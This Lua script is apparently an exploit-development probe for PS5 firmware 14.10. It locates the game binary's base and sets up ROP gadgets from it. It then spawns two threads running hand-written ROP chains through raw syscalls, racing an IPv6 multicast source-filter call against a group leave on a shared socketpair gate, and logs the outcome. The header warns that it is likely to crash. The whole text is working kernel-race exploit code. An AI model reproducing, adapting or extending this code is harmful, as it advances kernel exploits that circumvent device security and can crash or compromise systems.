-- CRASH_CLASS: HIGH
-- PS5 14.10 IPV6_MSFILTER vs leave: two children sharing one read gate.
-- This measures return-order outcomes. It does not itself prove the CVE.

print("=== PROBE 50m: SHARED-GATE FILTER / LEAVE ===")
local function num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(p, v) memory.write_dword(p, v) end
local function wq(p, v) memory.write_qword(p, v) end
local function z(p, n) for off = 0, n - 4, 4 do wd(p + off, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function fmt(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return tostring(v)
end
local function msleep(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    sc(240)(uint64(ts), uint64(0))
end
local function wait_changed(p, old)
    local v = memory.read_qword(p)
    for _ = 1, 25 do
        if fmt(v) ~= old then return v end
        msleep(1)
        v = memory.read_qword(p)
    end
    return v
end
local DEAD = "0x00000000DEADDEAD"
local READY = "0x0000000051515151"

local info = memory.alloc(0x200)
z(info, 0x200); wd(info, 0x160)
local ir = sc(593)(uint64(0), uint64(info))
local lo = num(memory.read_dword(info + 0x108))
local hi = num(memory.read_dword(info + 0x10c))
if num(ir) ~= 0 or lo == 0 then print("ABORT no eboot"); return end
local base = uint64(string.format("0x%X%08X", hi, lo))
local RET = base + 0x42
local POP_RAX = base + 0x992
local POP_RDI = base + 0xC9DFE
local POP_RSI = base + 0xD77D
local MOV_RDI_RAX = base + 0x92C67
local STUB = syscall.pipe.fn_addr

local fd = num(sc(97)(uint64(28), uint64(2), uint64(17)))
print("socket=" .. fd)
if fd < 0 or fd > 1024 then print("ABORT socket"); return end
local mreq = memory.alloc(32)
z(mreq, 32)
b(mreq, 0, 0xff); b(mreq, 1, 2); b(mreq, 15, 1)
wd(mreq + 16, 1)
local req = memory.alloc(160)
local sources = memory.alloc(128 * 128)
z(req, 160)
wd(req, 1); wd(req + 4, 1); wd(req + 8, 128)
b(req, 16, 28); b(req, 17, 28)
b(req, 24, 0xff); b(req, 25, 2); b(req, 39, 1)
wd(req + 40, 1)
wq(req + 144, sources)
for i = 1, 128 do
    local p = sources + (i - 1) * 128
    z(p, 128)
    b(p, 0, 28); b(p, 1, 28)
    b(p, 8, 0x20); b(p, 9, 1); b(p, 23, i)
end
local payload = memory.alloc(96); z(payload, 96)

local function joined()
    return sc(105)(uint64(fd), uint64(41), uint64(12), uint64(mreq), uint64(20))
end
local function left()
    return sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))
end
local function filter()
    return sc(105)(uint64(fd), uint64(41), uint64(74), uint64(req), uint64(152))
end

local j0 = joined()
local l0 = left()
local f0 = filter()
print("baseline join=" .. fmt(j0) .. " leave=" .. fmt(l0) ..
    " filter_after_leave=" .. fmt(f0))
if num(j0) ~= 0 or num(l0) ~= 0 then
    sc(6)(uint64(fd)); print("ABORT baseline"); return
end

local function pair()
    local fds = memory.alloc(8); z(fds, 8)
    local rv = sc(135)(uint64(1), uint64(1), uint64(0), uint64(fds))
    local rd = num(memory.read_dword(fds))
    local wr = num(memory.read_dword(fds + 4))
    if num(rv) ~= 0 or rd < 0 or wr < 0 or rd > 1024 or wr > 1024 then
        return nil
    end
    return {rd = rd, wr = wr}
end
local function close_pair(p)
    sc(6)(uint64(p.rd)); sc(6)(uint64(p.wr))
end

local function child(p, opt, arg, len, scratch)
    local stack = sc(477)(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xffffffff), uint64(0))
    if fmt(stack) == "0xFFFFFFFFFFFFFFFF" then return nil end
    local chain = stack + 0x10000 - 0x100
    z(chain, 0x100)
    local ready = memory.alloc(8)
    local readrv = memory.alloc(8)
    local result = memory.alloc(8)
    local tidbuf = memory.alloc(8)
    wq(ready, uint64(0xDEADDEAD))
    wq(readrv, uint64(0xDEADDEAD))
    wq(result, uint64(0xDEADDEAD))
    z(tidbuf, 8)
    local off = 0
    local function push(v) wq(chain + off, v); off = off + 8 end
    push(POP_RAX); push(uint64(0x51515151))
    push(POP_RDI); push(ready); push(MOV_RDI_RAX)
    push(POP_RDI); push(uint64(p.rd))
    push(POP_RSI); push(scratch)
    push(POP_RAX); push(uint64(3)); push(STUB) -- read gate
    push(POP_RDI); push(readrv); push(MOV_RDI_RAX)
    push(POP_RDI); push(uint64(fd))
    push(POP_RSI); push(uint64(41))
    push(POP_RAX); push(uint64(105)); push(STUB) -- filter or leave
    push(POP_RDI); push(result); push(MOV_RDI_RAX)
    push(POP_RDI); push(uint64(0))
    push(POP_RAX); push(uint64(431)); push(STUB) -- thr_exit
    if off > 0x100 then print("ABORT ROP chain overflow"); return nil end

    local ctx = memory.alloc(0x500); z(ctx, 0x500)
    wq(ctx + 0x108, uint64(0x480)); wq(ctx + 0x110, uint64(0x10000))
    wq(ctx + 0x0c0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3b))
    wq(ctx + 0x0f8, chain); wq(ctx + 0x0e0, RET)
    wq(ctx + 0x048, uint64(p.rd))
    wq(ctx + 0x050, scratch)
    wq(ctx + 0x058, uint64(opt)) -- also read length
    wq(ctx + 0x060, arg)
    wq(ctx + 0x098, arg)
    wq(ctx + 0x068, uint64(len))
    local cr = sc(430)(uint64(ctx), uint64(tidbuf), uint64(0))
    if num(cr) ~= 0 then print("ABORT thr_create=" .. fmt(cr)); return nil end
    return {ready = ready, readrv = readrv, result = result,
        tid = memory.read_qword(tidbuf)}
end

local function child_done(c)
    local rv = wait_changed(c.result, DEAD)
    if fmt(rv) == DEAD then return false, rv end
    for _ = 1, 25 do
        if num(sc(433)(c.tid, uint64(0))) ~= 0 then return true, rv end
        msleep(1)
    end
    return false, rv
end

local completed = 0
local trials = 16
local safe_to_close = true
for trial = 1, trials do
    local jr = joined()
    if num(jr) ~= 0 then print("ABORT join trial=" .. trial .. " rv=" .. fmt(jr)); break end
    local gate = pair()
    if not gate then print("ABORT pair trial=" .. trial); safe_to_close = false; break end
    local fscratch = memory.alloc(80)
    local lscratch = memory.alloc(80)
    local fc, lc
    if trial % 2 == 1 then
        fc = child(gate, 74, req, 152, fscratch)
        lc = child(gate, 13, mreq, 20, lscratch)
    else
        lc = child(gate, 13, mreq, 20, lscratch)
        fc = child(gate, 74, req, 152, fscratch)
    end
    if not fc or not lc then print("ABORT child trial=" .. trial); safe_to_close = false; break end
    local fr = wait_changed(fc.ready, DEAD)
    local lr = wait_changed(lc.ready, DEAD)
    if fmt(fr) ~= READY or fmt(lr) ~= READY then
        print("ABORT not ready trial=" .. trial .. " filter=" .. fmt(fr) .. " leave=" .. fmt(lr))
        safe_to_close = false; break
    end
    msleep(1) -- both children should be blocked on the same socketpair
    local wr = sc(4)(uint64(gate.wr), uint64(payload), uint64(87))
    if num(wr) ~= 87 then
        print("ABORT write trial=" .. trial .. " rv=" .. fmt(wr))
        safe_to_close = false; break
    end
    local fdn, fv = child_done(fc)
    local ldn, lv = child_done(lc)
    print("trial=" .. trial .. " creation=" .. ((trial % 2 == 1) and "filter_first" or "leave_first") ..
        " filter_read=" .. fmt(memory.read_qword(fc.readrv)) ..
        " leave_read=" .. fmt(memory.read_qword(lc.readrv)) ..
        " filter=" .. fmt(fv) .. " leave=" .. fmt(lv) ..
        " children_done=" .. tostring(fdn and ldn))
    if not fdn or not ldn then
        print("ABORT child result/exit missing"); safe_to_close = false; break
    end
    close_pair(gate)
    if num(memory.read_qword(fc.readrv)) ~= 74 or
        num(memory.read_qword(lc.readrv)) ~= 13 then
        print("ABORT short shared-gate read; trial cannot be interpreted")
        break
    end
    completed = completed + 1
    if num(lv) ~= 0 then print("ABORT leave rejected"); break end
end
if safe_to_close then sc(6)(uint64(fd)) end
print("summary completed=" .. completed .. " of=" .. trials)
print("canary pid=" .. tostring(sc(20)()))
print("=== PROBE 50m COMPLETE ===")
